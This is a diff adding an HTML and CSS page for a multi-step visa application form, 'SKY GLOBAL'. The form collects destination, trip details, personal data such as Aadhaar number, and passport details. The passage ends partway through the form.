@@ -1,0 +1,1768 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="SKY GLOBAL - Visa Application Form">
+    <title>SKY GLOBAL | Visa Application</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --primary-gold: #C9A961;
+            --secondary-gold: #F4E8C1;
+            --navy-blue: #1e3a5f;
+            --dark-blue: #0f172a;
+            --white: #ffffff;
+            --off-white: #f8fafc;
+            --text-dark: #1e293b;
+            --text-light: #64748b;
+            --success: #10b981;
+            --error: #ef4444;
+            --warning: #f59e0b;
+            --shadow: 0 20px 60px rgba(0,0,0,0.15);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: 'Inter', sans-serif;
+            color: var(--text-dark);
+            line-height: 1.6;
+            background: linear-gradient(135deg, #f0f4f8 0%, #d9e2ec 100%);
+            min-height: 100vh;
+        }
+
+        h1, h2, h3, h4, h5, h6 { font-family: 'Playfair Display', serif; font-weight: 700; }
+
+        /* Header */
+        .header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 2px 30px rgba(0,0,0,0.1);
+        }
+        .header-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo { display: flex; flex-direction: column; text-decoration: none; cursor: pointer; }
+        .logo-main {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--navy-blue) 0%, var(--primary-gold) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 2px;
+            line-height: 1;
+        }
+        .logo-sub { font-size: 0.75rem; color: var(--text-light); font-weight: 500; letter-spacing: 1px; margin-top: 3px; text-transform: uppercase; }
+        .header-buttons { display: flex; gap: 1rem; }
+        .btn {
+            padding: 0.75rem 1.75rem;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-family: 'Inter', sans-serif;
+        }
+        .btn-primary { background: linear-gradient(135deg, var(--primary-gold) 0%, #B8941F 100%); color: var(--white); box-shadow: 0 4px 15px rgba(201, 169, 97, 0.3); }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(201, 169, 97, 0.4); }
+        .btn-secondary { background: transparent; color: var(--navy-blue); border: 2px solid var(--navy-blue); }
+        .btn-secondary:hover { background: var(--navy-blue); color: var(--white); }
+        .btn-gold { background: linear-gradient(135deg, var(--primary-gold) 0%, #B8941F 100%); color: var(--white); box-shadow: 0 4px 15px rgba(201, 169, 97, 0.3); }
+        .btn-gold:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(201, 169, 97, 0.4); }
+        .btn-large { padding: 1rem 2.5rem; font-size: 1.05rem; }
+        .btn-back { background: #f1f5f9; color: var(--text-dark); }
+        .btn-back:hover { background: #e2e8f0; }
+        .btn-edit { background: transparent; color: var(--navy-blue); border: 2px solid var(--navy-blue); padding: 0.5rem 1rem; font-size: 0.85rem; cursor: pointer; }
+        .btn-edit:hover { background: var(--navy-blue); color: var(--white); }
+        .btn-full { width: 100%; justify-content: center; }
+        .btn-warning { background: linear-gradient(135deg, var(--warning), #d97706); color: var(--white); box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3); }
+        .btn-warning:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(245, 158, 11, 0.4); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none !important; }
+
+        /* Form Section */
+        .form-section { padding: 7rem 2rem 4rem; min-height: 100vh; }
+        .form-container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: var(--white);
+            border-radius: 16px;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.15);
+            padding: 2.5rem;
+        }
+
+        .form-header { text-align: center; margin-bottom: 2rem; }
+        .form-title { font-size: 2rem; color: var(--navy-blue); margin-bottom: 0.5rem; }
+        .form-subtitle { color: var(--text-light); font-size: 1rem; }
+
+        /* Clickable Step Indicator */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 0.75rem;
+            margin-bottom: 2.5rem;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .step-dot {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            background: #e2e8f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: var(--text-light);
+            transition: all 0.3s ease;
+            font-size: 0.95rem;
+            cursor: pointer;
+        }
+        .step-dot:hover { transform: scale(1.1); }
+        .step-dot.active {
+            background: linear-gradient(135deg, var(--primary-gold), #B8941F);
+            color: var(--white);
+            transform: scale(1.1);
+            box-shadow: 0 5px 15px rgba(201, 169, 97, 0.4);
+        }
+        .step-dot.completed { background: var(--success); color: var(--white); }
+        .step-line { width: 50px; height: 3px; background: #e2e8f0; align-self: center; border-radius: 2px; transition: all 0.3s ease; }
+        .step-line.completed { background: var(--success); }
+
+        .form-group { margin-bottom: 1.5rem; }
+        .form-label { display: block; font-weight: 600; color: var(--text-dark); margin-bottom: 0.6rem; font-size: 0.95rem; }
+        .form-label .required { color: var(--error); }
+        .form-label .optional { color: var(--text-light); font-weight: 400; font-size: 0.85rem; }
+        .form-input, .form-select, .form-textarea {
+            width: 100%;
+            padding: 0.9rem 1.2rem;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+            background: var(--white);
+        }
+        .form-input:focus, .form-select:focus, .form-textarea:focus {
+            outline: none;
+            border-color: var(--primary-gold);
+            box-shadow: 0 0 0 4px rgba(201, 169, 97, 0.1);
+        }
+        .form-input.error { border-color: var(--error); }
+        .form-input::placeholder { color: #94a3b8; }
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+        .form-row.three-col { grid-template-columns: repeat(3, 1fr); }
+
+        .counter-group { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.25rem; }
+        .counter-label { min-width: 100px; font-weight: 600; font-size: 1rem; }
+        .counter-controls { display: flex; align-items: center; gap: 1rem; background: #f8fafc; padding: 0.5rem 1.25rem; border-radius: 8px; border: 2px solid #e2e8f0; }
+        .counter-btn {
+            width: 38px; height: 38px;
+            border: none;
+            background: linear-gradient(135deg, var(--primary-gold), #B8941F);
+            color: var(--white);
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+        .counter-btn:hover { transform: scale(1.05); }
+        .counter-value { font-weight: 700; font-size: 1.2rem; min-width: 35px; text-align: center; color: var(--navy-blue); }
+
+        .radio-group, .checkbox-group { display: flex; flex-wrap: wrap; gap: 0.75rem; }
+        .radio-item, .checkbox-item { position: relative; }
+        .radio-item input, .checkbox-item input { position: absolute; opacity: 0; cursor: pointer; }
+        .radio-label, .checkbox-label {
+            display: block;
+            padding: 0.8rem 1.5rem;
+            background: #f8fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            font-size: 0.95rem;
+        }
+        .radio-item input:checked + .radio-label,
+        .checkbox-item input:checked + .checkbox-label {
+            background: linear-gradient(135deg, var(--primary-gold), #B8941F);
+            color: var(--white);
+            border-color: var(--primary-gold);
+        }
+
+        .section-divider { border: none; border-top: 2px solid #e2e8f0; margin: 2.5rem 0; }
+        .section-title-small {
+            font-size: 1.3rem;
+            color: var(--navy-blue);
+            margin-bottom: 1.25rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-family: 'Inter', sans-serif;
+            font-weight: 700;
+        }
+        .section-title-small i { color: var(--primary-gold); }
+
+        .info-box {
+            background: linear-gradient(135deg, rgba(201, 169, 97, 0.08), rgba(244, 232, 193, 0.3));
+            border-left: 4px solid var(--primary-gold);
+            padding: 1.25rem;
+            border-radius: 8px;
+            margin-bottom: 1.75rem;
+        }
+        .info-box-title { font-weight: 700; color: var(--navy-blue); margin-bottom: 0.4rem; display: flex; align-items: center; gap: 0.5rem; font-size: 1rem; }
+        .info-box-text { color: var(--text-light); font-size: 0.9rem; line-height: 1.5; }
+
+        .form-actions { display: flex; justify-content: space-between; margin-top: 2.5rem; padding-top: 2rem; border-top: 2px solid #e2e8f0; gap: 1rem; flex-wrap: wrap; }
+
+        /* Review */
+        .review-section { background: linear-gradient(135deg, #f8fafc, #f1f5f9); padding: 1.75rem; border-radius: 12px; margin-bottom: 1.25rem; border: 2px solid #e2e8f0; }
+        .review-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.25rem; padding-bottom: 1rem; border-bottom: 2px solid #e2e8f0; flex-wrap: wrap; gap: 0.75rem; }
+        .review-title { font-size: 1.15rem; font-weight: 700; color: var(--navy-blue); }
+        .review-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+        .review-item { display: flex; flex-direction: column; }
+        .review-label { font-size: 0.85rem; color: var(--text-light); margin-bottom: 0.25rem; font-weight: 500; }
+        .review-value { font-weight: 600; color: var(--text-dark); font-size: 1rem; word-break: break-word; }
+
+        /* Step 4 */
+        .token-section { text-align: center; padding: 2rem 1rem; }
+        .download-app-card {
+            background: var(--white);
+            border: 3px solid var(--primary-gold);
+            border-radius: 16px;
+            padding: 3rem 2rem;
+            margin: 2rem auto;
+            max-width: 600px;
+            box-shadow: 0 20px 60px rgba(201, 169, 97, 0.2);
+            text-align: center;
+        }
+        .download-app-icon {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, var(--primary-gold), #B8941F);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            color: var(--white);
+            font-size: 3rem;
+            box-shadow: 0 10px 30px rgba(201, 169, 97, 0.4);
+        }
+        .download-app-title { font-size: 1.6rem; color: var(--navy-blue); margin-bottom: 1rem; }
+        .download-app-text { color: var(--text-light); margin-bottom: 2rem; font-size: 1rem; line-height: 1.6; }
+        .download-app-btn {
+            background: linear-gradient(135deg, var(--primary-gold) 0%, #B8941F 100%);
+            color: var(--white);
+            padding: 1.2rem 2.5rem;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.75rem;
+            box-shadow: 0 8px 25px rgba(201, 169, 97, 0.4);
+            text-decoration: none;
+            margin-bottom: 1rem;
+        }
+        .download-app-btn:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(201, 169, 97, 0.5); }
+
+        .edit-app-btn {
+            background: transparent;
+            color: var(--warning);
+            padding: 0.85rem 1.75rem;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            border: 2px solid var(--warning);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-top: 0.5rem;
+        }
+        .edit-app-btn:hover { background: var(--warning); color: var(--white); }
+
+        .payment-box {
+            background: var(--white);
+            border: 3px solid var(--primary-gold);
+            border-radius: 16px;
+            padding: 2.5rem;
+            margin: 2rem auto;
+            max-width: 550px;
+            box-shadow: 0 20px 60px rgba(201, 169, 97, 0.2);
+            text-align: center;
+        }
+        .payment-amount {
+            font-size: 3.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--primary-gold), #B8941F);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.5rem;
+        }
+        .payment-label { color: var(--text-light); margin-bottom: 1.5rem; font-size: 1.05rem; }
+        .payment-methods { display: flex; justify-content: center; gap: 1rem; margin: 1.75rem 0; flex-wrap: wrap; }
+        .payment-method {
+            width: 70px; height: 45px;
+            background: linear-gradient(135deg, #f8fafc, #f1f5f9);
+            border-radius: 8px;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 700; color: var(--navy-blue);
+            border: 2px solid #e2e8f0;
+            font-size: 0.8rem;
+        }
+
+        .token-card {
+            background: linear-gradient(135deg, var(--navy-blue) 0%, var(--dark-blue) 100%);
+            color: var(--white);
+            padding: 3rem 2rem;
+            border-radius: 16px;
+            max-width: 650px;
+            margin: 2rem auto;
+            box-shadow: 0 30px 80px rgba(30, 58, 95, 0.3);
+            border: 3px solid var(--primary-gold);
+            text-align: center;
+        }
+        .token-icon { font-size: 4rem; margin-bottom: 1.25rem; color: var(--primary-gold); }
+        .token-title { font-size: 1.8rem; margin-bottom: 1rem; color: var(--white); }
+        .token-number {
+            font-size: 2rem;
+            font-weight: 800;
+            background: rgba(201, 169, 97, 0.15);
+            padding: 1.25rem 2rem;
+            border-radius: 12px;
+            margin: 1.75rem 0;
+            letter-spacing: 3px;
+            font-family: 'Courier New', monospace;
+            border: 2px solid var(--primary-gold);
+            color: var(--primary-gold);
+        }
+        .token-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--success);
+            padding: 0.6rem 1.5rem;
+            border-radius: 50px;
+            font-weight: 600;
+            margin-bottom: 1.75rem;
+            border: 2px solid var(--success);
+        }
+
+        .app-updates-notice {
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(16, 185, 129, 0.05));
+            border-left: 4px solid var(--success);
+            padding: 1.25rem;
+            border-radius: 8px;
+            margin-top: 1.5rem;
+            text-align: left;
+        }
+        .app-updates-notice .info-box-title { color: var(--success); }
+        .app-updates-notice .info-box-text { color: var(--text-dark); }
+
+        .loading {
+            display: inline-block;
+            width: 18px; height: 18px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: var(--white);
+            animation: spin 1s ease-in-out infinite;
+            vertical-align: middle;
+            margin-right: 0.5rem;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .form-container { padding: 1.5rem; }
+            .form-row, .form-row.three-col { grid-template-columns: 1fr; }
+            .form-title { font-size: 1.5rem; }
+            .step-line { width: 25px; }
+            .review-grid { grid-template-columns: 1fr; }
+            .form-actions { flex-direction: column; }
+            .form-actions .btn { width: 100%; justify-content: center; }
+            .token-number { font-size: 1.3rem; padding: 1rem; letter-spacing: 1px; }
+            .download-app-card, .payment-box { padding: 2rem 1.5rem; }
+            .payment-amount { font-size: 2.5rem; }
+            .radio-group { flex-direction: column; }
+            .radio-label { width: 100%; text-align: center; }
+            .edit-app-btn { width: 100%; justify-content: center; }
+        }
+
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="header-container">
+            <a href="index.html" class="logo">
+                <span class="logo-main">SKY GLOBAL</span>
+                <span class="logo-sub">Global Visa Assistance</span>
+            </a>
+            <div class="header-buttons">
+                <a href="index.html" class="btn btn-secondary">
+                    <i class="fas fa-arrow-left"></i> Back to Home
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Form Section -->
+    <div class="form-section">
+        <div class="form-container">
+            
+            <!-- Clickable Step Indicator -->
+            <div class="step-indicator" id="stepIndicator">
+                <div class="step-dot active" data-step="1" onclick="handleStepClick(1)">1</div>
+                <div class="step-line" id="line1"></div>
+                <div class="step-dot" data-step="2" onclick="handleStepClick(2)">2</div>
+                <div class="step-line" id="line2"></div>
+                <div class="step-dot" data-step="3" onclick="handleStepClick(3)">3</div>
+                <div class="step-line" id="line3"></div>
+                <div class="step-dot" data-step="4" onclick="handleStepClick(4)">4</div>
+            </div>
+
+            <!-- STEP 1 -->
+            <div id="step1" class="form-step">
+                <div class="form-header">
+                    <h2 class="form-title">Where Are You Planning to Go?</h2>
+                    <p class="form-subtitle">Select your destination and number of travellers</p>
+                </div>
+
+                <form id="step1Form" onsubmit="handleStep1(event)">
+                    <div class="form-group">
+                        <label class="form-label">Select Your Destination <span class="required">*</span></label>
+                        <select class="form-select" id="destination" required>
+                            <option value="">Choose a country...</option>
+                            <option value="Canada">🇨🇦 Canada</option>
+                            <option value="Germany">🇩🇪 Germany</option>
+                            <option value="United Arab Emirates">🇦🇪 United Arab Emirates</option>
+                            <option value="Singapore">🇸🇬 Singapore</option>
+                            <option value="United States">🇺🇸 United States</option>
+                            <option value="United Kingdom">🇬🇧 United Kingdom</option>
+                            <option value="Australia">🇦🇺 Australia</option>
+                            <option value="France">🇫🇷 France</option>
+                            <option value="New Zealand">🇳🇿 New Zealand</option>
+                            <option value="Italy">🇮🇹 Italy</option>
+                            <option value="Spain">🇪🇸 Spain</option>
+                            <option value="Switzerland">🇨🇭 Switzerland</option>
+                            <option value="Netherlands">🇳🇱 Netherlands</option>
+                            <option value="Ireland">🇮🇪 Ireland</option>
+                            <option value="Portugal">🇵🇹 Portugal</option>
+                            <option value="Greece">🇬🇷 Greece</option>
+                            <option value="Saudi Arabia">🇸🇦 Saudi Arabia</option>
+                            <option value="Qatar">🇶🇦 Qatar</option>
+                            <option value="Malaysia">🇲🇾 Malaysia</option>
+                            <option value="Thailand">🇹🇭 Thailand</option>
+                            <option value="Japan">🇯🇵 Japan</option>
+                            <option value="South Korea">🇰🇷 South Korea</option>
+                            <option value="Other">Other</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">How Many People Are Travelling?</label>
+                        
+                        <div class="counter-group">
+                            <span class="counter-label">Adults</span>
+                            <div class="counter-controls">
+                                <button type="button" class="counter-btn" onclick="updateCounter('adults', -1)">−</button>
+                                <span class="counter-value" id="adultsCount">1</span>
+                                <button type="button" class="counter-btn" onclick="updateCounter('adults', 1)">+</button>
+                            </div>
+                        </div>
+
+                        <div class="counter-group">
+                            <span class="counter-label">Children</span>
+                            <div class="counter-controls">
+                                <button type="button" class="counter-btn" onclick="updateCounter('children', -1)">−</button>
+                                <span class="counter-value" id="childrenCount">0</span>
+                                <button type="button" class="counter-btn" onclick="updateCounter('children', 1)">+</button>
+                            </div>
+                        </div>
+
+                        <div class="counter-group">
+                            <span class="counter-label">Infants</span>
+                            <div class="counter-controls">
+                                <button type="button" class="counter-btn" onclick="updateCounter('infants', -1)">−</button>
+                                <span class="counter-value" id="infantsCount">0</span>
+                                <button type="button" class="counter-btn" onclick="updateCounter('infants', 1)">+</button>
+                            </div>
+                        </div>
+
+                        <div style="margin-top: 1rem; padding: 1rem; background: linear-gradient(135deg, rgba(201, 169, 97, 0.1), rgba(244, 232, 193, 0.3)); border-radius: 8px; border: 2px solid var(--primary-gold);">
+                            <strong style="color: var(--navy-blue); font-size: 1.05rem;">Total Travellers: <span id="totalTravellers">1</span></strong>
+                        </div>
+                    </div>
+
+                    <div class="form-actions">
+                        <a href="index.html" class="btn btn-back">
+                            <i class="fas fa-arrow-left"></i> Exit to Home
+                        </a>
+                        <button type="submit" class="btn btn-primary btn-large">
+                            Next Step <i class="fas fa-arrow-right"></i>
+                        </button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- STEP 2 -->
+            <div id="step2" class="form-step hidden">
+                <div class="form-header">
+                    <h2 class="form-title">Tell Us About Your Trip</h2>
+                    <p class="form-subtitle">Just 5 quick questions to understand your travel plans</p>
+                </div>
+
+                <form id="step2Form" onsubmit="handleStep2(event)">
+                    <div class="form-group">
+                        <label class="form-label">What is the main purpose of your visit? <span class="required">*</span></label>
+                        <div class="radio-group">
+                            <div class="radio-item"><input type="radio" name="purpose" id="purpose1" value="Tourism" required><label for="purpose1" class="radio-label">Tourism</label></div>
+                            <div class="radio-item"><input type="radio" name="purpose" id="purpose2" value="Business"><label for="purpose2" class="radio-label">Business</label></div>
+                            <div class="radio-item"><input type="radio" name="purpose" id="purpose3" value="Study"><label for="purpose3" class="radio-label">Study</label></div>
+                            <div class="radio-item"><input type="radio" name="purpose" id="purpose4" value="Work"><label for="purpose4" class="radio-label">Work</label></div>
+                            <div class="radio-item"><input type="radio" name="purpose" id="purpose5" value="Family Visit"><label for="purpose5" class="radio-label">Family Visit</label></div>
+                            <div class="radio-item"><input type="radio" name="purpose" id="purpose6" value="Visit Friends"><label for="purpose6" class="radio-label">Visit Friends</label></div>
+                            <div class="radio-item"><input type="radio" name="purpose" id="purpose7" value="Medical Treatment"><label for="purpose7" class="radio-label">Medical Treatment</label></div>
+                            <div class="radio-item"><input type="radio" name="purpose" id="purpose8" value="Conference / Event"><label for="purpose8" class="radio-label">Conference / Event</label></div>
+                            <div class="radio-item"><input type="radio" name="purpose" id="purpose9" value="Transit"><label for="purpose9" class="radio-label">Transit</label></div>
+                            <div class="radio-item"><input type="radio" name="purpose" id="purpose10" value="Religious Travel"><label for="purpose10" class="radio-label">Religious Travel</label></div>
+                            <div class="radio-item"><input type="radio" name="purpose" id="purpose11" value="Other"><label for="purpose11" class="radio-label">Other</label></div>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">When are you planning to travel? <span class="required">*</span></label>
+                        <input type="date" class="form-input" id="travelDate" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">How long do you plan to stay? <span class="required">*</span></label>
+                        <select class="form-select" id="duration" required>
+                            <option value="">Select duration...</option>
+                            <option value="Up to 15 days">Up to 15 days</option>
+                            <option value="16–30 days">16–30 days</option>
+                            <option value="1–3 months">1–3 months</option>
+                            <option value="3–6 months">3–6 months</option>
+                            <option value="6–12 months">6–12 months</option>
+                            <option value="More than 1 year">More than 1 year</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Have you travelled internationally before? <span class="required">*</span></label>
+                        <div class="radio-group">
+                            <div class="radio-item"><input type="radio" name="prevTravel" id="prevTravel1" value="Yes" required><label for="prevTravel1" class="radio-label">Yes</label></div>
+                            <div class="radio-item"><input type="radio" name="prevTravel" id="prevTravel2" value="No"><label for="prevTravel2" class="radio-label">No</label></div>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Do you have a valid passport? <span class="required">*</span></label>
+                        <div class="radio-group">
+                            <div class="radio-item"><input type="radio" name="hasPassport" id="passport1" value="Yes" required><label for="passport1" class="radio-label">Yes</label></div>
+                            <div class="radio-item"><input type="radio" name="hasPassport" id="passport2" value="No"><label for="passport2" class="radio-label">No</label></div>
+                            <div class="radio-item"><input type="radio" name="hasPassport" id="passport3" value="Passport is being renewed"><label for="passport3" class="radio-label">Passport is being renewed</label></div>
+                        </div>
+                    </div>
+
+                    <div class="form-actions">
+                        <button type="button" class="btn btn-back" onclick="goBack()">
+                            <i class="fas fa-arrow-left"></i> Back
+                        </button>
+                        <button type="submit" class="btn btn-primary btn-large">
+                            Next Step <i class="fas fa-arrow-right"></i>
+                        </button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- STEP 3 -->
+            <div id="step3" class="form-step hidden">
+                <div class="form-header">
+                    <h2 class="form-title">Complete Your Visa Information</h2>
+                    <p class="form-subtitle">Please provide accurate information for your visa assistance</p>
+                </div>
+
+                <form id="step3Form" onsubmit="handleStep3(event)">
+                    <h3 class="section-title-small"><i class="fas fa-user"></i> Personal Information</h3>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label class="form-label">Full Name <span class="required">*</span></label>
+                            <input type="text" class="form-input" id="fullName" required placeholder="Enter your full name">
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Last Name <span class="optional">(Optional)</span></label>
+                            <input type="text" class="form-input" id="lastName" placeholder="Enter last name (optional)">
+                        </div>
+                    </div>
+
+                    <div class="form-row three-col">
+                        <div class="form-group">
+                            <label class="form-label">Date of Birth <span class="required">*</span></label>
+                            <input type="date" class="form-input" id="dob" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Gender <span class="required">*</span></label>
+                            <select class="form-select" id="gender" required>
+                                <option value="">Select...</option>
+                                <option value="Male">Male</option>
+                                <option value="Female">Female</option>
+                                <option value="Other">Other</option>
+                                <option value="Prefer not to say">Prefer not to say</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Nationality <span class="required">*</span></label>
+                            <select class="form-select" id="nationality" required>
+                                <option value="">Select...</option>
+                                <option value="Indian">Indian</option>
+                                <option value="Other">Other</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label class="form-label">Country of Residence <span class="required">*</span></label>
+                            <select class="form-select" id="residence" required>
+                                <option value="">Select...</option>
+                                <option value="India">India</option>
+                                <option value="Other">Other</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Current City <span class="required">*</span></label>
+                            <input type="text" class="form-input" id="city" required placeholder="Enter your city">
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label class="form-label">Mobile Number <span class="required">*</span></label>
+                            <input type="tel" class="form-input" id="mobile" required placeholder="Enter 10 digit mobile number" maxlength="10" oninput="formatMobileNumber(this)">
+                            <small style="color: var(--text-light); font-size: 0.8rem; margin-top: 0.3rem; display: block;">Enter exactly 10 digits</small>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Email Address <span class="required">*</span></label>
+                            <input type="email" class="form-input" id="email" required placeholder="your@email.com">
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label class="form-label">Aadhaar Number <span class="required">*</span></label>
+                            <input type="text" class="form-input" id="aadhaar" required placeholder="XXXX XXXX XXXX" maxlength="14" oninput="formatAadhaar(this)">
+                            <small style="color: var(--text-light); font-size: 0.8rem; margin-top: 0.3rem; display: block;">12-digit Aadhaar number (for Indian nationals)</small>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Marital Status <span class="required">*</span></label>
+                            <select class="form-select" id="maritalStatus" required>
+                                <option value="">Select...</option>
+                                <option value="Single">Single</option>
+                                <option value="Married">Married</option>
+                                <option value="Divorced">Divorced</option>
+                                <option value="Widowed">Widowed</option>
+                                <option value="Other">Other</option>
+                                <option value="Prefer not to say">Prefer not to say</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <hr class="section-divider">
+
+                    <h3 class="section-title-small"><i class="fas fa-passport"></i> Passport Details</h3>
+
+                    <div class="info-box">
+                        <div class="info-box-title"><i class="fas fa-info-circle"></i> Important Notice</div>
+                        <div class="info-box-text">Please keep your original documents ready for further assistance. Sky Global does not require document uploads through this website.</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Do you have a valid passport? <span class="required">*</span></label>
+                        <div class="radio-group">
+                            <div class="radio-item"><input type="radio" name="validPassport" id="validPass1" value="Yes" required onchange="togglePassportFields()"><label for="validPass1" class="radio-label">Yes</label></div>
+                            <div class="radio-item"><input type="radio" name="validPassport" id="validPass2" value="No" onchange="togglePassportFields()"><label for="validPass2" class="radio-label">No</label></div>
+                        </div>
+                    </div>
+
+                    <div id="passportDetails" class="hidden">
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label class="form-label">Passport Number <span class="required">*</span></label>
+                                <input type="text" class="form-input" id="passportNumber" placeholder="e.g. A1234567" maxlength="9" oninput="formatPassportNumber(this)" style="text-transform: uppercase;">
+                                <small style="color: var(--text-light); font-size: 0.8rem; margin-top: 0.3rem; display: block;">1 letter + 7 digits (e.g. A1234567)</small>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Passport Issuing Country <span class="required">*</span></label>
+                                <select class="form-select" id="passportCountry">
+                                    <option value="">Select...</option>
+                                    <option value="India">India</option>
+                                    <option value="Other">Other</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label class="form-label">Passport Issue Date <span class="required">*</span></label>
+                                <input type="date" class="form-input" id="passportIssue">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Passport Expiry Date <span class="required">*</span></label>
+                                <input type="date" class="form-input" id="passportExpiry">
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Place of Issue</label>
+                            <input type="text" class="form-input" id="passportPlace" placeholder="Enter place of issue">
+                        </div>
+                    </div>
+
+                    <hr class="section-divider">
+
+                    <h3 class="section-title-small"><i class="fas fa-stamp"></i> Visa Information</h3>
+
+                    <div class="review-section" style="margin-bottom: 1.5rem;">
+                        <div class="review-grid">
+                            <div class="review-item"><span class="review-label">Destination</span><span class="review-value" id="reviewDestination">-</span></div>
+                            <div class="review-item"><span class="review-label">Number of Travellers</span><span class="review-value" id="reviewTravellers">-</span></div>
+                            <div class="review-item"><span class="review-label">Purpose</span><span class="review-value" id="reviewPurpose">-</span></div>
+                            <div class="review-item"><span class="review-label">Travel Date</span><span class="review-value" id="reviewTravelDate">-</span></div>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Have you previously applied for a visa for this destination?</label>
